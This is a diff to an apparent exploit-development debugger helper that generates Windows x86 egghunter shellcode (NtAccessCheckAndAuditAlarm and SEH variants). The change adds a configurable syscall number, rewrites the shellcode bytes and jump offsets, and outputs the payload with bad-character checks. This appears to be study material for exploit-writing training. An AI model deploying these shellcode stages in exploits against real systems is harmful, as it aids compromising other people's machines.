@@ -8,48 +8,54 @@ type EggOptions = {
   mode: EggMode;
   wow64: boolean;
   badchars: number[];
+  syscall: number | null;
 };
 
-// NtAccessCheckAndAuditAlarm egghunter (syscall 0x02, INT 0x2E). 32 bytes.
+// NtAccessCheckAndAuditAlarm egghunter (INT 0x2E). 34 bytes.
 // Scans page-by-page using the syscall for access checks, then dword-by-dword
-// with scasd for double-tag matching. Tag placeholder at offset 18.
+// with scasd for double-tag matching.
+// Uses mov eax,imm32 for the syscall number so it works with any value
+// (Win10 builds use 0x1C9+, which doesn't fit in push imm8).
+// Syscall number at offset 8, tag at offset 20.
 const NTACCESS_X86: number[] = [
   0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
   0x42,                         // inc edx
   0x52,                         // push edx
-  0x6a, 0x02,                   // push 0x2
-  0x58,                         // pop eax
+  0xb8, 0xc9, 0x01, 0x00, 0x00, // mov eax, 0x1C9
   0xcd, 0x2e,                   // int 0x2e
   0x3c, 0x05,                   // cmp al, 0x5
   0x5a,                         // pop edx
-  0x74, 0xef,                   // je short (back to or dx)
+  0x74, 0xed,                   // je short (back to or dx)
   0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
   0x8b, 0xfa,                   // mov edi, edx
   0xaf,                         // scasd
-  0x75, 0xea,                   // jne short (back to inc edx)
+  0x75, 0xe8,                   // jne short (back to inc edx)
   0xaf,                         // scasd
-  0x75, 0xe7,                   // jne short (back to inc edx)
+  0x75, 0xe5,                   // jne short (back to inc edx)
   0xff, 0xe7,                   // jmp edi
 ];
 
-// WoW64 variant: uses inc ecx (0x41) instead of inc edx (0x42) to avoid REX
-// prefix collision in the WoW64 thunk layer.
+// WoW64 variant: the scanning register is changed from edx to ecx so
+// the inc opcode is 0x41 (inc ecx) instead of 0x42 (inc edx), avoiding
+// the REX.X prefix byte that breaks in the WoW64 thunk layer.
+// All edx references become ecx: or cx, push ecx, pop ecx, mov edi,ecx.
+// Syscall number at offset 8, tag at offset 20. 34 bytes.
 const NTACCESS_WOW64: number[] = [
-  0x66, 0x81, 0xca, 0xff, 0x0f,
-  0x41,
-  0x6a, 0x02,
-  0x58,
-  0xcd, 0x2e,
-  0x3c, 0x05,
-  0x5a,
-  0x74, 0xef,
-  0xb8, 0x54, 0x30, 0x30, 0x57,
-  0x8b, 0xfa,
-  0xaf,
-  0x75, 0xea,
-  0xaf,
-  0x75, 0xe7,
-  0xff, 0xe7,
+  0x66, 0x81, 0xc9, 0xff, 0x0f, // or cx, 0x0fff
+  0x41,                         // inc ecx
+  0x51,                         // push ecx
+  0xb8, 0xc9, 0x01, 0x00, 0x00, // mov eax, 0x1C9
+  0xcd, 0x2e,                   // int 0x2e
+  0x3c, 0x05,                   // cmp al, 0x5
+  0x59,                         // pop ecx
+  0x74, 0xed,                   // je short (back to or cx)
+  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
+  0x8b, 0xf9,                   // mov edi, ecx
+  0xaf,                         // scasd
+  0x75, 0xe8,                   // jne short (back to inc ecx)
+  0xaf,                         // scasd
+  0x75, 0xe5,                   // jne short (back to inc ecx)
+  0xff, 0xe7,                   // jmp edi
 ];
 
 // SEH-based egghunter. 70 bytes. Position-independent via call $+5/pop.
@@ -104,9 +110,12 @@ const SEH_EGGHUNTER: number[] = [
   0xff, 0xe7,                         // jmp edi
 ];
 
-const TAG_OFFSET_NTACCESS = 18;
-const TAG_OFFSET_NTACCESS_WOW64 = 16;
+const TAG_OFFSET_NTACCESS = 20;
+const TAG_OFFSET_NTACCESS_WOW64 = 20;
 const TAG_OFFSET_SEH = 0x34;
+
+const SYSCALL_OFFSET_NTACCESS = 8;
+const SYSCALL_OFFSET_NTACCESS_WOW64 = 8;
 
 function uniqueBytes(values: number[] | undefined): number[] {
   const seen = new Set<number>();
@@ -130,12 +139,17 @@ function tagBytes(tag: string): number[] {
   return tag.padEnd(4, "X").slice(0, 4).split("").map((c) => c.charCodeAt(0));
 }
 
-export function buildEgghunter(options: EggOptions): { bytes: number[]; size: number; badcharHits: string[] } {
+function dwordLE(val: number): number[] {
+  return [val & 0xff, (val >> 8) & 0xff, (val >> 16) & 0xff, (val >> 24) & 0xff];
+}
+
+export function buildEgghunter(options: EggOptions): { bytes: number[]; size: number; badcharHits: string[]; syscallUsed: number | null } {
   const tag = tagBytes(options.tag);
   const badSet = new Set(uniqueBytes(options.badchars));
 
   let template: number[];
   let tagOffset: number;
+  let syscallOffset: number | null = null;
   let label: string;
 
   if (options.mode === "seh") {
@@ -145,16 +159,26 @@ export function buildEgghunter(options: EggOptions): { bytes: number[]; size: nu
   } else if (options.wow64) {
     template = [...NTACCESS_WOW64];
     tagOffset = TAG_OFFSET_NTACCESS_WOW64;
+    syscallOffset = SYSCALL_OFFSET_NTACCESS_WOW64;
     label = "ntaccess wow64 egghunter";
   } else {
     template = [...NTACCESS_X86];
     tagOffset = TAG_OFFSET_NTACCESS;
+    syscallOffset = SYSCALL_OFFSET_NTACCESS;
     label = "ntaccess egghunter";
   }
 
   template.splice(tagOffset, 4, ...tag);
+
+  let syscallUsed: number | null = null;
+  if (syscallOffset !== null) {
+    const sysnum = options.syscall ?? 0x1c9;
+    template.splice(syscallOffset, 4, ...dwordLE(sysnum));
+    syscallUsed = sysnum;
+  }
+
   const badcharHits = checkBadchars(template, label, badSet);
-  return { bytes: template, size: template.length, badcharHits };
+  return { bytes: template, size: template.length, badcharHits, syscallUsed };
 }
 
 function bytesToHex(bytes: number[]): string {
@@ -169,18 +193,20 @@ export function createEgghunterCommand(): Command {
   return {
     name: "egghunter",
     description: "Generate NtAccess/SEH egghunter stubs with badchar checking.",
-    usage: "dx @$osed().egghunter(tag?, mode?, wow64?, badchars?)",
+    usage: "dx @$osed().egghunter(tag?, mode?, wow64?, badchars?, syscall?)",
     examples: [
       'dx @$osed().egghunter("W00T")',
       'dx @$osed().egghunter("B33F", "seh")',
       'dx @$osed().egghunter("W00T", "ntaccess", true)',
       'dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D")',
+      'dx @$osed().egghunter("W00T", "ntaccess", false, "", 0x1c9)',
     ],
     schema: {
       tag: { type: "string", default: "W00T" },
       mode: { type: "string", enum: ["ntaccess", "seh"], default: "ntaccess" },
       wow64: { type: "boolean", default: false },
       badchars: { type: "array", default: [] },
+      syscall: { type: "number", default: null },
     },
     execute(options: Record<string, unknown>): CommandResult {
       const opts: EggOptions = {
@@ -188,12 +214,14 @@ export function createEgghunterCommand(): Command {
         mode: (options.mode as EggMode) ?? "ntaccess",
         wow64: (options.wow64 as boolean) ?? false,
         badchars: (options.badchars as number[]) ?? [],
+        syscall: (options.syscall as number | null) ?? null,
       };
 
       const result = buildEgghunter(opts);
 
       out.section("Egghunter");
-      out.info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result.size} bytes`);
+      const sysLabel = result.syscallUsed !== null ? ` | Syscall: 0x${result.syscallUsed.toString(16).toUpperCase()}` : "";
+      out.info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result.size} bytes${sysLabel}`);
       out.print(bytesToHex(result.bytes));
       out.print(bytesToPython(result.bytes));
       if (result.badcharHits.length > 0) {
